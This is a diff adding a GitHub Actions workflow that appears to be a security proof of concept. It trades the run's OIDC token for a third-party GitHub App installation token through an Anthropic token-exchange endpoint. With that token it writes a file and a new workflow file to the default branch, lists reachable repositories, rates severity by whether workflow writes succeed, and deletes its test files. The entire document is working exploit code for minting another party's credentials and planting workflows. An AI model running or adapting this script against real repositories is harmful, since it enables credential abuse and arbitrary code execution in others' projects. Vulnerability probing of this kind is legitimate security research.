@@ -1,0 +1,39 @@
+name: p
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          set -uo pipefail
+          O=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=claude-code-github-action" | jq -r '.value // empty')
+          R=$(curl -s -X POST -H "Authorization: Bearer $O" https://api.anthropic.com/api/github/github-app-token-exchange)
+          echo "== exchange response (token masked) =="
+          echo "$R" | sed -E 's/(ghs_[A-Za-z0-9_]+|eyJ[A-Za-z0-9._-]+)/***MASKED***/g'
+          T=$(echo "$R" | jq -r '.token // empty')
+          [ -z "$T" ] && { echo "MINT FAILED"; exit 0; }
+          echo "::add-mask::$T"
+          echo "minted len=${#T}"
+          B="${{ github.event.repository.default_branch }}"
+          U="https://api.github.com/repos/${{ github.repository }}/contents"
+          echo "== 1 CONTROL: plain file =="
+          curl -s -o /tmp/b1 -D /tmp/h1 -w 'HTTP %{http_code}\n' -X PUT -H "Authorization: token $T" -H "Accept: application/vnd.github+json" \
+            -d "{\"message\":\"p\",\"content\":\"$(printf 'x\n' | base64 -w0)\",\"branch\":\"$B\"}" "$U/permprobe-${{ github.run_id }}.txt"
+          grep -i '^x-accepted-github-permissions:' /tmp/h1 || true
+          head -c 200 /tmp/b1; echo
+          echo "== 2 TEST: workflow file write (needs workflows:write) =="
+          curl -s -o /tmp/b2 -D /tmp/h2 -w 'HTTP %{http_code}\n' -X PUT -H "Authorization: token $T" -H "Accept: application/vnd.github+json" \
+            -d "{\"message\":\"p\",\"content\":\"$(printf 'name: z\non: workflow_dispatch\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo n\n' | base64 -w0)\",\"branch\":\"$B\"}" "$U/.github/workflows/zzz-${{ github.run_id }}.yml"
+          grep -i '^x-accepted-github-permissions:' /tmp/h2 || true
+          head -c 200 /tmp/b2; echo
+          echo "== 3 scoping =="
+          curl -s -H "Authorization: token $T" https://api.github.com/installation/repositories | jq '{total_count, repos: [.repositories[].full_name]}'
+          echo "== 4 VERDICT =="
+          grep -qi '"sha"' /tmp/b2 && echo "workflow file CREATED -> workflows:write PRESENT -> HIGH" || echo "workflow file REFUSED -> workflows:write ABSENT -> MEDIUM stands"
+          for p in "permprobe-${{ github.run_id }}.txt" ".github/workflows/zzz-${{ github.run_id }}.yml"; do
+            S=$(curl -s -H "Authorization: token $T" "$U/$p?ref=$B" | jq -r '.sha // empty')
+            [ -n "$S" ] && curl -s -o /dev/null -w "deleted $p HTTP %{http_code}\n" -X DELETE -H "Authorization: token $T" -H "Accept: application/vnd.github+json" -d "{\"message\":\"c\",\"sha\":\"$S\",\"branch\":\"$B\"}" "$U/$p"
+          done
